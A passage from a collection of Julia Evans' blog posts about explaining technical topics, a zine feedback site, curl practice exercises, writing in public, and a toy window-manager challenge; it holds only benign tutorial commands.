useful, it really helps to\nshow someone how lambdas could help them do a task that they could actually\nimagine themselves doing, and ideally a task that they’ve done before. \n\n distilling down examples from real code can take a long time \n\n The example I just gave of explaining how to use  sort  with  lambda  is\npretty simple and it didn’t take me a long time to come up with, but turning\nreal code into a standalone example can take a really long time! \n\n For example, I was thinking of including an example of some weird CSS behaviour\nin this post to illustrate how it’s fun to create examples with weird or\nsurprising behaviour. I spent 2 hours taking a real problem I had this week,\nmaking sure I understood what was actually happening with the CSS, and making\nit into a minimal example. \n\n In the end it “just” took  5 lines of HTML and a tiny bit of CSS  to\ndemonstrate the problem and it doesn’t really look like it took hours to write.\nBut originally it was hundreds of lines of JS/CSS/JavaScript, and it takes time\nto untangle all that and come up with something small that gets at the heart of\nthe issue! \n\n But I think it’s worth it to take the time to make examples really clear and\nminimal – if hundreds of people are reading your example, you’re saving them\nall so much time! \n\n that’s all for now! \n\n I think there’s a lot more to say about examples – for instance I think there\nare a few different types of useful examples, like: \n\n \n examples that are surprising to the reader, which are more about changing\nsomeone’s mental model than providing code to use directly \n examples that are easy to copy and paste to use as a starting point \n \n\n but maybe I’ll write about that another day. :) \n\n"},
{"url": "https://jvns.ca/blog/2019/09/13/a-year-explaining-computer-things/", "title": "Taking a year to explain computer things", "content": "\n     \n\n I’ve been working on explaining computer things I’m learning on this blog for 6 years.\nI wrote one of my first posts,  what does a shell even do?  on\nSept 30, 2013. Since then, I’ve written 11 zines, 370,000 words on this blog, and\ngiven 20 or so talks. So it seems like I like explaining things a lot. \n\n tl;dr: I’m going to work on explaining computer things for a year \n\n Here’s the exciting news: I left my job a month ago and my plan is to spend the next year working on\nexplaining computer things! \n\n As for why I’m doing this – I was talking through some reasons with my friend Mat last night and he\nsaid “well, sometimes there are things you just feel compelled to do”. I think that’s all there is\nto it :) \n\n what does “explain computer things” mean? \n\n I’m planning to: \n\n \n write some more zines (maybe I can write 10 zines in a year? we’ll see! I want to tackle both\ngeneral-interest and slightly more niche topics, we’ll see what happens). \n work on some more interactive ways to learn things. I learn things best by trying things out and\nbreaking them, so I want to see if I can facilitate that a little bit for other people. I started\na project around this in May which has been on the backburner for a bit but which I’m excited\nabout. Hopefully I’ll release it soon and then you can try it out and tell me what you think! \n \n\n I say “a year” because I think I have at least a year’s worth of ideas and I can’t predict how I’ll\nfeel after doing this for a year. \n\n how: run a business \n\n I started a corporation almost exactly a year ago, and I’m planning to keep running my\nexplaining-things efforts as a business. This business has been making more than I made in my first\nprogramming job (that is, definitely enough money to live on!), which has been really surprising\nand great (thank you!). \n\n some parameters of the business: \n\n \n I’m not planning to hire employees or anything, it’ll just be me and some (awesome) freelancers.\nThe biggest change I have in mind is that I’m hoping to find a freelance editor to help me with editing. \n I also don’t have any specific plans for world domination or to work 80-hour weeks.  I’m just\ngoing to make zines & things that explain computer concepts and sell them on the internet, like\nI’ve been doing. \n No commissions or consulting work, just building ideas I have \n \n\n It’s been pretty interesting to learn more about running a small business and so far I like it more\nthan I thought I would. (except for taxes, which I like exactly as much as I thought I would) \n\n that’s all! \n\n I’m excited to keep making explanations of computer things and to have more time to do it. This blog\nmight change a bit away from “here’s what I’m learning at work these days” and towards “here are\nattempts at explaining things that I mostly already know”. It’ll be different!  We’ll see how it\ngoes! \n\n"},
{"url": "https://jvns.ca/blog/2023/03/31/zine-feedback-site/", "title": "Building a custom site for zine feedback", "content": "\n     \n\n Hello! A few years I wrote a post called  A new way I’m getting feedback on my posts: beta readers! \nabout how I’d started using beta readers. \n\n The basic strategy for getting feedback there was to email people a PDF and ask\nfor feedback. This was kind of inefficient, and so over the past couple of\nyears, I’ve worked a lot with  Marie Flanagan  to\nimprove the process. In this post we’ll talk about: \n\n \n the custom site we built to handle all of the feedback \n how (and why) we designed that site \n the specific categories of feedback we ask for (and why we chose those categories) \n \n\n The site isn’t open source, this post is just about the process of building and\nusing it. There are some screenshots further down. \n\n First, let’s talk about some problems with the original process. \n\n problem 1: managing the feedback was awkward \n\n The original process for getting feedback from beta readers was to send an\nemail to people asking them for feedback, and then semi-manually collate the\nreplies. \n\n For each comment I got, I needed to figure out whether I wanted to address it\nor not, and then mark it as completed once it was handled. \n\n I originally handled this by: \n\n \n making a Trello card for each page of the zine \n adding each comment to the Trello card for the appropriate page (either manually or with a Python script) \n checking off the comments when they were handled \n \n\n This kind of worked, but it wasn’t great. I could only ask at most 10 people for\nfeedback because the overhead of managing all the replies was just too much for\nme. \n\n problem 2: the feedback wasn’t categorized \n\n The second problem I ran into was that the feedback wasn’t really categorized\nor tagged in any way, and this made it much harder to decide what I should do\nabout each piece of feedback. \n\n For example – one comment I got was “CSS often seems random to me”. Is the\nperson suggesting that I explain more about CSS on the page? Do they want to be\nconvinced that CSS  isn’t  random? Do they think CSS is a bad example of the\nthing I’m trying to illustrate? Are they confused about why I’m bringing up CSS\nat all? Without more context, it’s hard to tell. \n\n There was also lots of feedback that I could easily understand and incorporate,\nbut I really wanted to set more guidelines so that people could give me the\nkind of feedback I needed. \n\n the inspiration: Help This Book \n\n In 2021, I read a great book called  Write Useful\nBooks  by Rob Fitzpatrick. One of the main\nsuggestions in the book was to gather feedback early and often from beta readers. \n\n But their way to get feedback wasn’t just “email people and have them write you\nback!” It came with a custom website for readers to comment on in-progress books called\n Help This Book . \n\n Here’s a screenshot of Help This Book, from their homepage: \n\n \n\n In this screenshot, the reader has highlighted a sentence and is being prompted\nfor what kind of feedback they want to provide. After they click on an icon\n(like “Confusing”, they’ll be able to type in their comment). \n\n but Help This Book didn’t work with images \n\n My zines aren’t text, so this kind of Google Docs-style interface where you\nhighlight text wouldn’t really work for me. \n\n So in 2021 I asked Marie if they would help me build a custom site to collect\nfeedback on zines, very heavily inspired by Help This Book. \n\n The hardest parts were: \n\n \n Deciding the categories of feedback we wanted to ask for from readers \n Designing the site \n \n\n As usual, actually writing the code was the easy part, so I’m not going to talk\nabout that. \n\n categories help guide people’s feedback \n\n Before I talk about the feedback categories we chose, I want to talk about why\nfeedback categories are so important. \n\n In the “Help This Book” interface (and in the interface of the tool we build),\nthe categories help guide people’s feedback – before someone even starts\nwriting, they need to click on a category for the feedback. \n\n This is helpful for a few reasons: \n\n \n It helps remove types of feedback we don’t want. For example, there’s no\ncategory for “this is a typo”, because we don’t want people to point out\ntypos – that’s the copy editor’s job :) \n It guides people to phrase their feedback in a form that’s easier to take\naction on. For example: “I love this” feedback generally doesn’t require any\naction, but if someone says “This is confusing”, we probably need to clarify\nsomething. \n We can easily group similar kinds of feedback together and deal with them\nall at once. For example, if a bunch of people have left “Confusing”\nfeedback on a page, we can look at that all at once. \n \n\n How we started: read existing feedback \n\n We figured out the categories by looking at feedback I’d gotten on previous\nzines and trying to categorize it. Here are the 5 categories we ended up with. \n\n category 1: “I learned something” \n\n The whole goal of the zines is to teach people things, so “I learned\nsomething!” is kind of the gold star. If we’re getting this kind of feedback,\nwe’re doing our job. \n\n category 2: “I love this” \n\n We noticed a lot of feedback where the person didn’t specifically say that they\nlearned anything, but just seemed to like the page. \n\n I was originally kind of against this category (“the point is for people to\nlearn things!“), but we ended up including this because there was a lot of this\ntype of feedback and I’m super happy we did. \n\n It’s always very encouraging to see all the hearts, and usually we just take it\nas a signal that we should keep that page. \n\n category 3: “I have a question” \n\n The idea here is to gather specific questions about something the reader didn’t\nunderstand. For example, here are some of the excellent questions readers left on\nearly drafts of the  How DNS Works : \n\n \n what is a “domain”? \n why do we need to map a domain name to an IP address? \n are these  all  the DNS record types? \n are the DNS query and response between resolver (function) and resolver (server) the exact same format as between resolver (server) and authoritative nameservers? \n do authoritative nameservers push updates to resolvers or do resolvers “check” frequently to update their caches? \n does my local computer cache DNS query responses at all? \n is the resolver built into the browser or is this a server the browser knows to go and query? \n \n\n Questions aren’t always a bad thing – sometimes the question indicates that\nthe reader understood the topic well, is curious, and has some followup\nquestions that are outside of the scope of the zine. \n\n But lot of these questions were definitely questions that we wanted the zine to\nanswer, and we mostly took them as a sign that the explanations needed to be\nimproved. \n\n category 4: “I’m confused” \n\n This was a category we actually didn’t have in our first version. But we\nnoticed that we were getting a lot of suggestions that essentially amounted to\n“I’m confused”. \n\n What we realized was – sometimes an explanation is  so  confusing that the\nreader isn’t able to formulate a specific question about what they don’t\nunderstand. Figuring out a specific question is hard, especially if the\nexplanation you’re reading isn’t very clear! \n\n A few great examples of “I’m confused” feedback on “How DNS Works”: \n\n \n I don’t get the last section in the response record, the “glue records” \n This section is over my head… \n I would really appreciate some kind of simple index on what types of NS records exist and how they relate. \n I didn’t see where SOA records were defined. Did I miss something earlier or later? \n I was confused here by the server word again, due to it being able to refer to a resolver / nameserver. In this case, server => resolver \n \n\n People also leave a lot of feedback of the form “I was initially confused by X, but then I figured it out”, which is great. \n\n category 5: “I have a suggestion” \n\n The last category is a kind of catchall “other” category for anything that\ndoesn’t fit in the others. We usually ask people not to point out typos or\nmistakes, but sometimes people do anyway, which is fine. \n\n we listen to learners, not experts \n\n The goal is to get beta reader feedback from people who are trying to learn the\nmaterial, not from experts. \n\n Because of this, we’ll almost always prioritize “I’m confused” or “I have a\nquestion” feedback over “I have a suggestion” feedback, unless the person\nleaving the suggestion is someone who I know and whose judgement I trust. \n\n If beta readers are learning things and they’re not too confused  – we’re\ndoing our job! It’s working! \n\n Technical review and copy editing come at the end of the process, and I’m not\ngoing to talk about them in this post. \n\n a gif of the zine feedback site \n\n Here’s what the feedback site looks like as a beta reader: \n\n \n\n Here’s a screenshot of all the feedback categories: \n\n \n\n the admin interface \n\n Next, there’s an admin interface where I \n\n \n check off comments as they’re handled \n add my own comments \n \n\n I’m going to share a couple of examples of pages from the admin section, one\nwhere I think the feedback is more positive than the other. \n\n Both of these pages are from a VERY early draft, and they’ve already been edited quite a bit :) \n\n a “good” page \n\n I’ve blurred out all the comments, but the important thing here is the emojis:\nthere are a couple of lightbulbs (“I learned something!”) and a couple of\nhearts (“I love this!”). \n\n Even without reading anything, this tells me that this page has some promise –\nthere are definitely things to be improved, but people like it. \n\n \n\n positive emojis are incredibly helpful \n\n Being able to quickly scan through the zine and say “okay, this has 10 hearts\nand 7 lightbulbs, obviously people love this page” is amazing: it makes it\nreally easy to tell when a page is working. \n\n This is good because: \n\n \n it tells us what we  don’t  need to work on \n it’s motivating (“we’re getting somewhere! people like this!”) \n \n\n a “bad” page \n\n Next, here’s an example of another page in the admin interface where things\naren’t going so well. \n\n You’ll notice this page only has question marks and suggestions. (the ones in\npurple are comments that I wrote, the ones in blue are from readers) \n\n The comments are blurred out, but several of them are about how the Rust panel\nseems arbitrary. That was something I kind of knew already, but hearing it from\nreaders is really helpful and helps me know that I should prioritize fixing it. \n\n \n\n confusion emojis are also super helpful \n\n If we see a lot of “I’m confused” and “I have a suggestion” emojis on a page, that’s also very useful! \n\n Sometimes we’ll react to that by totally rewriting or deleting a page, and then\ndoing another round of feedback to see if the problems have been fixed. \n\n “I have a question” emojis aren’t always a bad thing – sometimes the question\nindicates that the reader understood the topic well, is curious, and has some\nfollowup questions that are outside of the scope of the zine. \n\n pages with no feedback \n\n There are usually one or two pages that get no comments at all from beta readers. A couple of ways we handle this: \n\n \n ask a trusted friend for their take on the page \n post it to Mastodon or Twitter and see what the comments are like \n follow our gut (“no, I think this is important, let’s keep it”) \n \n\n overall feedback \n\n Readers can also enter overall feedback at the end. Here’s what that looks like\nin the admin interface (again blurred out). \n\n This is a super useful section – sometimes people will leave comments here\nlike “I didn’t really understand X”, and it’ll make it clear that we really need\nto improve the explanation of X. \n\n \n\n the tech stack \n\n I said earlier that writing the code was the easy part so I won’t talk about the code too much. Here are a few facts about the tech stack though. It has: \n\n \n a Go backend (which becomes a static binary) \n a SQLite database \n a Vue.js frontend \n a DigitalOcean server \n \n\n some more notes on how it works: \n\n \n all of the zine pages are committed into the Git repository and compiled into\nthe Go binary. (It might be smarter to store them in the database instead,\nbut I didn’t do that, maybe one day!) \n the pages are password-protected, and I email people the password when\nI ask them for feedback \n when I want to deploy, I rebuild the Go binary locally (using  tinybuild ), scp it to the\nDigitalOcean server, and restart the systemd process. \n \n\n It’s not open source and nobody else can use it because it’s very heavily\ncustomized to my use case, completely undocumented, and I made the questionable\ndesign choice to store all of the zine pages in the git repository :). I\noccasionally think about improving it so that other people can use it, but I\nthink there’s a strong change I will never feel motivated to do that. \n\n having a dedicated site for feedback has made a huge difference \n\n We originally built this site in summer 2021, and so far have used it for  How DNS Works ,  The Pocket Guide to Debugging , and the currently-in-progress zine on how computers represent data in binary in memory. \n\n It’s made it possible to get feedback from dozens of people instead of just 3\nor 4, and I think it’s really improved the zines’ quality. \n\n"},
{"url": "https://jvns.ca/blog/2019/08/27/curl-exercises/", "title": "curl exercises", "content": "\n     \n\n Recently I’ve been interested in how people learn things. I was reading Kathy Sierra’s great book  Badass: Making Users Awesome . It talks about the idea of  deliberate practice . \n\n The idea is that you find a small micro-skill that can be learned in maybe 3 sessions of 45 minutes,\nand focus on learning that micro-skill. So, as an exercise, I was trying to think of a computer\nskill that I thought could be learned in 3 45-minute sessions. \n\n I thought that making HTTP requests with  curl  might be a skill like that, so here are some curl\nexercises as an experiment! \n\n what’s curl? \n\n curl is a command line tool for making HTTP requests. I like it because it’s an easy way to test\nthat servers or APIs are doing what I think, but it’s a little confusing at first! \n\n Here’s a drawing explaining curl’s most important command line arguments (which is page 6 of my  Bite Size Networking  zine). You can click to make it bigger. \n\n \n\n fluency is valuable \n\n With any command line tool, I think having fluency is really helpful. It’s really nice to be able to\njust type in the thing you need. For example recently I was testing out the Gumroad API and I was\nable to just type in: \n\n curl https://api.gumroad.com/v2/sales \\\n                         -d \"access_token=<SECRET>\" \\\n                         -X GET  -d \"before=2016-09-03\"\n \n\n and get things working from the command line. \n\n 21 curl exercises \n\n These exercises are about understanding how to make different kinds of HTTP requests with curl.\nThey’re a little repetitive on purpose. They exercise basically everything I do with curl. \n\n To keep it simple, we’re going to make a lot of our requests to the same website:\n https://httpbin.org . httpbin is a service that accepts HTTP requests and then tells you what request\nyou made. \n\n \n Request  https://httpbin.org \n Request  https://httpbin.org/anything . httpbin.org/anything will look at the request you made,\nparse it, and echo back to you what you requested. curl’s default is to make a GET request. \n Make a POST request to  https://httpbin.org/anything \n Make a GET request to  https://httpbin.org/anything , but this time add some query parameters (set\n value=panda ). \n Request google’s robots.txt file (www.google.com/robots.txt) \n Make a GET request to  https://httpbin.org/anything  and set the header  User-Agent: elephant . \n Make a DELETE request to  https://httpbin.org/anything \n Request  https://httpbin.org/anything  and also get the response headers \n Make a POST request to  https://httpbin.org/anything  with the JSON body  {\"value\": \"panda\"} \n Make the same POST request as the previous exercise, but set the Content-Type header to\n application/json  (because POST requests need to have a content type that matches their body).\nLook at the  json  field in the response to see the difference from the previous one. \n Make a GET request to  https://httpbin.org/anything  and set the header  Accept-Encoding: gzip  (what happens? why?) \n Put a bunch of a JSON in a file and then make a POST request to  https://httpbin.org/anything  with\nthe JSON in that file as the body \n Make a request to  https://httpbin.org/image  and set the header ‘Accept: image/png’. Save the\noutput to a PNG file and open the file in an image viewer. Try the same thing with different\n Accept:  headers. \n Make a PUT request to  https://httpbin.org/anything \n Request  https://httpbin.org/image/jpeg , save it to a file, and open that file in your image\neditor. \n Request  https://www.twitter.com . You’ll get an empty response. Get curl to show you the response\nheaders too, and try to figure out why the response was empty. \n Make any request to  https://httpbin.org/anything  and just set some nonsense headers (like  panda: elephant ) \n Request  https://httpbin.org/status/404  and  https://httpbin.org/status/200 . Request them again and\nget curl to show the response headers. \n Request  https://httpbin.org/anything  and set a username and password (with  -u username:password ) \n Download the Twitter homepage ( https://twitter.com ) in Spanish by setting the  Accept-Language: es-ES  header. \n Make a request to the Stripe API with curl. (see  https://stripe.com/docs/development  for how,\nthey give you a test API key). Try making exactly the same request to  https://httpbin.org/anything . \n \n\n"},
{"url": "https://jvns.ca/blog/2023/08/07/tactics-for-writing-in-public/", "title": "Some tactics for writing in public", "content": "\n     \n\n Someone recently asked me – “how do you deal with writing in public? People on\nthe internet are such assholes!” \n\n I’ve often heard the advice “don’t read the comments”, but actually I’ve\nlearned a huge amount from reading internet comments on my posts from strangers\nover the years, even if sometimes people are jerks. So I want to explain some\ntactics I use to try to make the comments on my posts more informative and\nuseful to me, and to try to minimize the number of annoying comments I get. \n\n talk about facts \n\n On here I mostly talk about facts – either facts about computers, or stories\nabout my experiences using computers. \n\n For example  this post  about tcpdump contains some basic facts about how to use tcpdump,\nas well as an example of how I’ve used it in the past. \n\n Talking about facts means I get a lot of fact-based comments like: \n\n \n people sharing their own similar (or different) experiences (“I use tcpdump a lot to look at our RTP sequence numbers”) \n pointers to other resources (“the documentation from F5 about tcpdump is great”) \n other interesting related facts I didn’t mention (“you can use tcpdump -X\ntoo”, “netsh on windows is great”, “you can use  sudo tcpdump -s 0 -A\n'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'  to filter for HTTP GET requests) \n potential problems or gotchas (“be careful about running tcpdump as root, try just setting the required capabilities instead”) \n questions (“Is there a way to place the BPF filter after IP packet reassembly?” or “what’s the advantage of tcpdump over wireshark?”) \n mistakes I made \n \n\n In general, I’d say that people’s comments about facts tend to stay pretty\nnormal. The main kinds of negative comments I get about facts are: \n\n \n occasionally people get a little rude about facts I didn’t mention (“Didn’t\nuse -n in any of the examples…please…“). I think I didn’t mention  -n  in\nthat post because at the time I didn’t know why the  -n  flag was useful\n(it’s useful because it turns off this annoying reverse DNS lookup that\ntcpdump does by default so you can see the IP addresses). \n people are also sometimes weird about mistakes. I mostly try to head this off\nby trying to be self-aware about my knowledge level on a topic, and saying\n“I’m not sure…” when I’m not sure about something. \n \n\n stories are great \n\n I think stories encourage pretty good discussion. For example,  why you should understand (a little) about TCP \nis a story about a time it was important for me to understand how TCP worked. \n\n When I share stories about problems I solved, the comments really help me\nunderstand how what I learned fits into a bigger context. For example: \n\n \n is this a common problem? people will often comment saying “this happened to me too!” \n what are other common related problems that come up? \n are there other possible solutions I didn’t consider? \n \n\n Also I think these kinds of stories are incredibly important – that post\ndescribes a bug that was VERY hard for me to solve, and the only reason I was\nable to figure it out in the first place was that I read  this blog post . \n\n ask technical questions \n\n Often in my blog posts I ask technical questions that I don’t know the answer\nto (or just mention “I don’t know X…”). This helps people focus their\nreplies a little bit – an obvious comment to make is to provide an answer to\nthe question, or explain the thing I didn’t know! \n\n This is fun because it feels like a guaranteed way to get value out of people’s\ncomments – people LOVE answering questions, and so they get to look smart, and\nI get the answer to a question I have! Everyone wins! \n\n fix mistakes \n\n I make a lot of mistakes in my blog posts, because I write about a lot of\nthings that are on the edge of my knowledge. When people point out mistakes, I\noften edit the blog post to fix it. \n\n Usually I’ll stay near a computer for a few hours after I post a blog post so\nthat I can fix mistakes quickly as they come up. \n\n Some people are very careful to list every single error they made in their blog\nposts (“errata: the post previously said X which was wrong, I have corrected it\nto say Y”). Personally I make mistakes constantly and I don’t have time for\nthat so I just edit the post to fix the mistakes. \n\n ask for examples/experiences, not opinions \n\n A lot of the time when I post a blog post, people on Twitter/Mastodon will\nreply with various opinions they have about the thing. For example, someone\nrecently replied to a blog post about DNS saying that they love using zone\nfiles and dislike web interfaces for managing DNS records. That’s not an\nopinion I share, so I asked them why. \n\n They explained that there are some DNS record types (specifically  TLSA ) that they find\noften aren’t supported in web interfaces. I didn’t know that people used  TLSA \nrecords, so I learned something! Cool! \n\n I’ve found that asking people to share their  experiences  (“I wanted to use\nX DNS record type and I couldn’t”) instead of their  opinions   (“DNS web\nadmin interfaces are bad”) leads to a lot of useful information and\ndiscussion. I’ve learned a lot from it over the years, and written a lot of\ntweets like “which DNS record types have you needed?” to try to extract more\ninformation about people’s experiences. \n\n I try to model the same behaviour in my own work when I can – if I have an\nopinion, I’ll try to explain the experiences I’ve had with computers that\ncaused me to have that opinion. \n\n start with a little context \n\n I think internet strangers are more likely to reply in a weird way when they\nhave no idea who you are or why you’re writing this thing. It’s easy to make\nincorrect assumptions! So often I’ll mention a little context about why I’m\nwriting this particular blog post. \n\n For example: \n\n \n A little while ago I started using a Mac, and one of my biggest frustrations\nwith it is that often I need to run Linux-specific software. \n \n\n or \n\n \n I’ve started to run a few more servers recently (nginx playground, mess with\ndns, dns lookup), so I’ve been thinking about monitoring. \n \n\n or \n\n \n Last night, I needed to scan some documents for some bureaucratic reasons.\nI’d never used a scanner on Linux before and I was worried it would take hours\nto figure out… \n \n\n avoid causing boring conversations \n\n There are some kinds of programming conversations that I find extremely boring\n(like “should people learn vim?” or “is functional programming better than\nimperative programming?“). So I generally try to avoid writing blog posts that\nI think will result in a conversation/comment thread that I find annoying or\nboring. \n\n For example, I wouldn’t write about my opinions about functional programming: I\ndon’t really have anything interesting to say about it and I think it would\nlead to a conversation that I’m not interested in having. \n\n I don’t always succeed at this of course (it’s impossible to predict what\npeople are going to want to comment about!), but I try to avoid the most\nobvious flamebait triggers I’ve seen in the past. \n\n There are a bunch of “flamebait” triggers that can set people off on a\nconversation that I find boring: cryptocurrency, tailwind, DNSSEC/DoH, etc. So\nI have a weird catalog in my head of things not to mention if I don’t want to\nstart the same discussion about that thing for the 50th time. \n\n Of course, if you think that conversations about functional programming are\ninteresting, you should write about functional programming and start the\nconversations you want to have! \n\n Also, it’s often possible to start an interesting conversation about a topic\nwhere the conversation is normally boring. For example I often see the same\ntalking points about IPv6 vs IPv4 over and over again, but I remember the\ncomments on  Reasons for servers to support IPv6 \nbeing pretty interesting. In general if I really care about a topic I’ll talk\nabout it anyway, but I don’t care about functional programming very much so I\ndon’t see the point of bringing it up. \n\n preempt common suggestions \n\n Another kind of “boring conversation” I try to avoid is suggestions of things I\nhave already considered. Like when someone says “you should do X” but I\nalready know I could have done X and chose not to because of A B C. \n\n So I often will add a short note like “I decided not to do X because of A B\nC” or “you can also do X” or “normally I would do X, here I didn’t because…”.\nFor example, in  this post about nix , I list a bunch\nof Nix features I’m choosing not to use (nix-shell, nix flakes, home manager)\nto avoid a bunch of helpful people telling me that I should use flakes. \n\n Listing the things I’m  not  doing is also helpful to readers – maybe\nsomeone new to nix will discover nix flakes through that post and decide to use\nthem! Or maybe someone will learn that there are exceptions to when a certain\n“best practice” is appropriate. \n\n set some boundaries \n\n Recently on Mastodon I complained about some gross terminology (“domain\ninformation groper”) that I’d just noticed in the dig man page on my machine. A\nfew dudes in the replies (who by now have all deleted their posts) asked me to\nprove that the original author  intended  it to be offensive (which of course\nis besides the point, there’s just no need to have\n a term widely understood to be referring to sexual assault \nin the dig man page) or tried to explain to me why\nit actually wasn’t a problem. \n\n So I blocked a few people and wrote a quick post: \n\n \n man so many dudes in the replies demanding that i prove that the person who\nnamed dig “domain information groper” intended it in an offensive way. Big day\nfor the block button I guess :) \n \n\n I don’t do this too often, but I think it’s very important on social media to\noccasionally set some rules about what kind of behaviour I won’t tolerate. My\ngoal here is usually to drive away some of the assholes (they can unfollow me!)\nand try to create a more healthy space for everyone else to have a conversation\nabout computers in. \n\n Obviously this only works in situations (like Twitter/Mastodon) where I have\nthe ability to garden my following a little bit over time – I can’t do this on\nHN or Reddit or Lobsters or whatever and wouldn’t try. \n\n As for fixing it – the dig maintainers removed the problem language years ago,\nbut Mac OS still has a very outdated version for license reasons. \n\n (you might notice that this section is breaking the “avoid boring\nconversations” rule above, this section was certain to start a very boring\nargument, but I felt it was important to talk about boundaries so I left it in) \n\n don’t argue \n\n Sometimes people seem to want to get into arguments or make dismissive\ncomments. I don’t reply to them, even if they’re  wrong . I dislike arguing on\nthe internet and I’m extremely bad at it, so it’s not a good use of my time. \n\n analyze negative comments \n\n If I get a lot of negative comments that I didn’t expect, I try to see if I can\nget something useful out of it. \n\n For example, I wrote a  toy DNS resolver  once and some of the commenters\nwere upset that I didn’t handle parsing the DNS packet. At the time I thought\nthis was silly (I thought DNS parsing was really straightforward and that it\nwas obvious how to do it, who cares that I didn’t handle it?) but I realized\nthat maybe the commenters didn’t think it was easy or obvious, and wanted to\nknow how to do it. Which makes sense! It’s not obvious at all if you haven’t\ndone it before! \n\n Those comments partly inspired  implement DNS in a weekend , which focuses much more\nheavily on the parsing aspects, and which I think is a much better explanation\nhow to write a DNS resolver. So ultimately those comments helped me a lot, even\nif I found them annoying at the time. \n\n (I realize this section makes me sound like a Perfectly Logical Person who does\nnot get upset by negative public criticism, I promise this is not at all the\ncase and I have 100000 feelings about everything that happens on the internet\nand get upset all the time. But I find that analyzing the criticism and trying\nto take away something useful from it helps a bit) \n\n that’s all! \n\n Thanks to Shae, Aditya, Brian, and Kamal for reading a draft of this. \n\n Some other similar posts I’ve written in the past: \n\n \n some blogging principles \n some blogging myths \n \n\n"},
{"url": "https://jvns.ca/blog/2019/11/25/challenge--make-a-bouncy-window-manager/", "title": "Challenge: Write a bouncy window manager", "content": "\n     \n\n Hello! I’m writing a short series of programming challenges with\n Julian ,\nand this is the first one! \n\n the challenge \n\n \n\n requirements \n\n The goal here is to make a very silly Linux window manager that bounces its windows\naround the screen, like in the gif above. \n\n anti-requirements \n\n The window manager doesn’t need to do anything else! It doesn’t need to support: \n\n \n moving or resizing windows \n switching between windows \n minimizing windows \n literally any of the other things you might normally expect a window manager to do \n \n\n It turns out implementing this kind of toy window manager is surprisingly approachable! \n\n the setup: start with tinywm \n\n All the instructions here only work on Linux (since this is about writing a Linux window manager). \n\n starter kit: tinywm \n\n Writing a window manager from scratch seems intimidating (at first I didn’t\neven know how to start!). But then I found\n tinywm , which is a tiny window manager\nwritten in only  50 lines of C . This is a GREAT starting point and there’s\nan annotated version of the source code which explains a lot of the details.\nThere’s a Python version of tinywm too, but I wasn’t able to get it to work. \n\n I did this challenge by modifying  tinywm  and it worked really well. \n\n tools \n\n \n Xephyr  lets you embed an X session in a window in your regular desktop, so that you can develop your toy window manager without breaking your usual desktop. I ran it like this:  Xephyr -ac -screen 1280x1024 -br -reset -terminate 2> /dev/null :1 & \n You can start an xterm in the Xephyr desktop with  xterm -display :1 \n I compiled my window manager with  gcc bouncewm.c -g -o bouncewm -lX11  and ran it with  env DISPLAY=:1 ./bouncewm \n xtrace  lets you trace all requests to the X windows system that your window manager is making. I found it really helpful when debugging. (run it like  xtrace ./bouncewm ) \n \n\n documentation \n\n Some useful references: \n\n \n the  dwm source code  (dwm is a 2000-line-of-C window manager) \n the  Xlib programming manual \n \n\n If you’re not comfortable writing C, there are also libraries that let you work\nwith X in other languages. I personally found C easier to use because a lot of\nthe window manager documentation and examples I found were for the Xlib C library. \n\n my experience: 5 hours, 50 lines of code \n\n To give you a very rough idea of the difficulty of this exercise: I did this in\n4 or 5 hours this morning and last night, producing the window manager you see\nin the gif at the top of the blog post (which is 50 lines of code). I’d never\nlooked at the source code for a window manager before yesterday. \n\n As usual when working with a new library I spent most of that time being\nconfused about various basic things about how X works. (and as a result I\nlearned several new things about X!) \n\n For me this challenge was a fun way to: \n\n \n learn some basics about the X window system protocol (I’ve been using window managers for 15 years, today I got to write one!) \n research an unfamiliar library (“ooh, what does this function do?”) \n use a C library, since I don’t usually write C \n \n\n send me your solution if you do this! \n\n I’ll post the solution I came up in a week. If you think this window manager\nchallenge sounds fun and end up doing it, I’d love it if you sent me your\nsolution (to julia@jvns.ca)! \n\n I’d be delighted to post any solutions you send me in the solutions blog post. \n\n"},
{"url": "https://jvns.ca/blog/confusing-explanations/", "title": "Patterns in confusing explanations", "content": "\n     \n\n Hello! Recently I’ve been thinking about why I explain things the way I do. The\nusual way I write is: \n\n \n Try to learn a topic \n Read a bunch of explanations that I find confusing \n Eventually understand the topic \n Write an explanation that makes sense to me, to help others \n \n\n So why do I find all these explanations so confusing? I decided to try and find\nout! I came up with a list of 13 patterns that make explanations hard for me to\nunderstand. For each pattern I’ll also explain what I like to do instead to\navoid the issue. \n\n these patterns are very normal \n\n This list isn’t meant to make you feel bad about your writing. I’ve probably\ndone all of these things! I’m certainly going to do them again! I even did at\nleast one of them  while writing this post ! \n\n But knowing that I’m likely to accidentally do these things makes it easier for\nme to avoid them, and it makes me more receptive to critique when people point\nout issues with my writing (“Julia, this is assuming a lot of knowledge that I\ndon’t have!“). \n\n Being aware of these patterns also helps me when  reading  a confusing\nexplanation: “oh, I’m not confused by this explanation because I’m stupid, I’m\nconfused because it’s introduced 6 new-to-me concepts and it hasn’t explained\nwhat any of them is yet!“. \n\n why this post is framed in a negative way \n\n I practically always write in a positive way (“X is a good practice!”) instead of in\na negative way (“Y is a bad practice!”). So why am I writing about confusing\npatterns instead of writing about positive patterns? \n\n Writing clearly is a LOT of work. A big part of what motivates me to put in the\nwork to write clearly is my frustration with confusing technical explanations (“ugh,\neverything I read about Linux containers was SO confusing, I wish someone had\njust told me X Y Z…“). \n\n But, if I’m not careful, it’s easy to reproduce the exact same confusing\npatterns in my own writing!  And the problem with positive patterns (like\n“avoid introducing unnecessary jargon”) is that they seem so obvious that I\ntrick myself into thinking I’m following them, even when I’m not! So I’m\nwriting these down to try to keep myself honest and hopefully help you avoid\nsome of these patterns as well. \n\n now for the patterns! \n\n Now that I’ve explained my motivation, let’s explain the patterns! Here’s a\nquick index of all of them. They’re not in any particular order. \n\n \n pattern 1: making outdated assumptions about the audience’s knowledge \n pattern 2: having inconsistent expectations of the reader’s knowledge \n pattern 3: strained analogies \n pattern 4: fun illustrations on dry explanations \n pattern 5: unrealistic examples \n pattern 6: jargon that doesn’t mean anything \n pattern 7: missing key information \n pattern 8: introducing too many concepts at a time \n pattern 9: starting out abstract \n pattern 10: unsupported statements \n pattern 11: no examples \n pattern 12: explaining the “wrong” way to do something without saying it’s wrong \n pattern 13: “what” without “why” \n \n\n pattern 1: making outdated assumptions about the audience’s knowledge \n\n I see a lot of writing, especially systems writing, that makes outdated\nassumptions about what the reader knows. For example, here’s a paragraph from\n this Git book  comparing Git’s implementation of branching to other version control tools. \n\n \n Nearly every VCS has some form of branching 